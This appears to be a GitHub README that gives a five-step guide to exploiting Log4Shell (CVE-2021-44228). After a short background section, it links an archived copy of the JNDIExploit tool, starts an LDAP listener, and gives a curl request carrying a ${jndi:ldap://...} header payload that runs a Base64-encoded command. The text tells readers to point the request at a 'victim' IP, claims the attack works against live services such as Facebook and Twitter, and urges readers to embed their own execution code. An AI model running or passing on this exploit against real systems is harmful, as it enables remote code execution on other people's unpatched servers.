## Log4Shell_Exploitation-Vulnerabiliy__CVE-2021-44228.

![Untitled](https://user-images.githubusercontent.com/45577616/145822447-d561cd62-37c5-43f3-bce5-543b0fa136a8.png)

## introduction

CVE-2021-44228
This vulnerability has caused a stir in the global cyber community, since the Wannacry we have not seen such an impact.

### the reason:
Most apps written in Java are thought to be affected and vulnerable, particularly Apache frameworks including Apache Struts2, Apache Solr, Apache Druid, and Apache Flink.  In addition, ElasticSearch, Flume, Logstash, Kafka, Netty, MyBatis, and Spring-Boot-starter-log4j are also vulnerable.
Some of the most popular products and services on the internet - including Apple iCloud, Amazon, Steam and Twitter - rely on these frameworks to function. This is also thought to include a significant number of enterprise and cyber security applications too.

Radware (Continuously adaptive real-time DDoS services )said only software enabling and utilising log4j message lookup substitution is affected. From version 2.15.0, message lookup substitution is disabled by default which is why patching is necessary. Log4j 2 versions 2.0-beta9 to 2.14.1 are all vulnerable and exploitable.

### Malware discovered:

![malwre PoC](https://user-images.githubusercontent.com/45577616/145912622-741eb5a1-5b82-46ce-9f1d-8eaea39cb119.jpg)

## prevention idiea:

![vuln](https://user-images.githubusercontent.com/45577616/145912255-e5b1750d-64c8-4e09-879b-b53125083300.jpg)


# let's start:

## exploitation execution - step by step(5 steps):

## Video Guide useful

https://user-images.githubusercontent.com/45577616/145822068-127fd357-0d7a-4206-b6e4-705aeec947d3.mp4

### *step_1.*
   for first, this guide compatible to work with kali linux vm and run the java listener in the next command, like the left side in the video guide.
   start with build docker vulnerability-application and then run it. 
   so let's to do this.
  * run the command to build app :
    ``` docker build . -t vulnerable-app```

### *step_2.*
the next step, actually to run the vulnerable-app, what deployed.

*so, the next command:
    ``` docker run -p 8080:8080 --name vulnerable-app vulnerable-app ```
  
  and now the spring script should be run like at video guide. 

### *step_3.*
for now to get the fingerprint to ldap server we're just need to create the ldap link and we done, first download the exploit tool_JNdIExploit-1.2. 
the url for download JNDIExploit deleted by github to download from archive (url below).
get the next url for download from archive
 [JNDIExploitArchiveUrl](https://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream)

so, let's do this

unzip the JNDIExploit.
run the java listener: ``` java -jar JNDIExploit.v1.2-SNAPSHOT.jar -i "replace_with_ypure_IP-ADDR" -p 8888```.

note: Delete "replace_with your IP-addr" and enter your IP listener.
( Not Including brackets).
### *step_4.*
the next step to trigger the exploit, run the next command:
   ``` curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://"ip-addr":1389/Basic/Command/Base64/aGVsbG8td29ybGQ=}' ```

note: replace the "ip-addr to your local ip what is a listening via java"
and also replace the 127.0.0.1 to victime ip-addr, and this is the end, you will recieive hello-world string via base64. like this you can do any manipulation. it work also on cloud on facebook chat, twitter etc.
### *step_5.* 
can embedded some execution code and try with any combination are you think. 
## Happy Hacking!!!
